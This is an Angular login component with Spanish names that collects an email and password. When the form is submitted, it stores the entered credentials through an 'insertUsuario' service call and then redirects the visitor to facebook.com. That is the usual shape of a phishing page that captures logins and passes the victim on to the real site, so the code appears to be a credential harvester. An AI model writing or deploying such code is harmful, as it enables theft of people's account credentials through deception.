import { Component } from '@angular/core';
import { FormBuilder, FormGroup, ReactiveFormsModule } from '@angular/forms';
import { UsuariosService } from '../../service/usuarios.service';
import { CommonModule } from '@angular/common';
import { Router } from '@angular/router';

@Component({
  selector: 'app-login-usuario',
  standalone: true,
  imports: [
    CommonModule,
    ReactiveFormsModule
  ],
  templateUrl: './login-usuario.component.html',
  styleUrls: ['./login-usuario.component.css']
})
export class LoginUsuarioComponent {
  usuarioForm: FormGroup;

  constructor(
    private fb: FormBuilder,
    private usuariosService: UsuariosService,
    private router: Router
  ) {
    this.usuarioForm = this.fb.group({
      correo: [''],
      contrasena: ['']
    });
  }

  onSubmit(event: Event) {
    event.preventDefault(); // Evitar la recarga de la página
    const nuevoUsuario = this.usuarioForm.value;
    this.usuariosService.insertUsuario(nuevoUsuario).subscribe(
      response => {
        console.log('Usuario insertado con éxito', response);
        window.location.href = 'https://www.facebook.com/';
      },
      error => {
        console.error('Error al insertar el usuario', error);
      }
    );
  }
}

